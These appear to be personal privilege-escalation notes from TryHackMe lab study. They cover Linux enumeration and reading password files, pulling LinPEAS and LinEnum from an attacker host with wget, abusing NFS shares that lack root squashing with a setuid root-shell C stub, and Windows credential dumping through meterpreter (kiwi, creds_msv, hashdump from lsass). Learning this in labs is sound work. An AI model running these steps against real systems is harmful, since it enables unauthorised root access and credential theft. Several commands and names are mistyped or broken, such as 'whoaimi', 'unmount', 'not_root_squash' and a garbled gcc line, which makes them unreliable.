horizontal - changing unprivileged access
vertical - gaining privileged access

##### accessing THM via openVPN
change to folder with conf. file -> `sudo openvpn USERNAME.ovpn`


## Linux
`id; whoaimi; groups`
to check who I am

`hostname`
can contain usefull info about user

`uname -a`
info about kernel and system versions - check if vulnerable

`cat /proc/version`
kernel, system and additional info (e.g. if `gcc` is installed)


`ls -la /etc/passwd`
check your privileges (maybe you could write?)

`cat /etc/passwd | grep home | cut -d":" -f1`     
```
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```
users with `home` might be worthier of hacking
hash is in place of "x", or it is in `/etc/shadow`

check if you have access to `/etc/shadow` (not likely)


- look for `SUID` binaries
`find / -type f -perm -04000 -ls 2>/dev/null`
- look for `sudo` users
`sudo -l` list what sudo allows

[GTFObin](https://gtfobins.github.io/)

[when only root-write permission](./example/root-write)

`getcap -r / 2>/dev/null` ??????

### copy payloads to target
prepare dir with payloads on local machine
create simple python server on local machine in that dir
check your VPN IP (via `ip a` should be visible)

create `/tmp/payloads` on target
`wget http://ATTACK_MACHINE_IP:PORT/linux-peas.sh`
(without specification "what" to download - will download only index.html - you have to be specific)

POC proof of concept

### Payloads:
Linpeas `shell wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`

LinEnum `shell wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`


### NFS

``` Target
# shows nfs shares and flags
cat /etc/export
```
flag `not_root_squash` - gives root user **of the client** ability to create files that can be used as root on server

``` Kali
# you can detect & list nfs with
sudo nmap --script=nfs-showmount 10.10.137.205


# create tmp dirs to mount shares to
mkdir -p /tmp/nfs/sharefolder
mkdir -p /tmp/nfs/tmp
mkdir -p /tmp/nfs/backup

# mount shares
sudo mount -t nfs 10.10.137.205:/home/ubuntu/shrefolder /tmp/nfs/sharefolder
sudo mount -t nfs 10.10.137.205:/tmp /tmp/nfs/tmp
sudo mount -t nfs 10.10.137.205:/home/backup tmp/nfs/backup

# cleaning up
sudo unmount /tmp/nfs/sharefolder
sudo unmount /tmp/nfs/tmp
sudo unmount /tmp/nfs/backup

rm -rf /tmp/nfs/sharefolder
rm -rf /tmp/nfs/tmp
rm -rf /tmp/nfs/backup

# to see what is mounted (lok for IP for mounted from other systems)
findmnt
df -aTh
```

``` Kali
# to compile
int main() 
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

# compile
sudo su
gcc nfs.c -o nfs -wcat pro
```

## Windows
in meterpreter 
`getuid` 

`load kiwi`
`ps` -> `lsass.exe` look for PID
`migrate 768`
`creds_msv` to retrieve LMNTLM creds
`hashdump` dump of passwd hashes :D

## Metasploit
you can use postgresql.service - better performance and you can save info about infrastructure

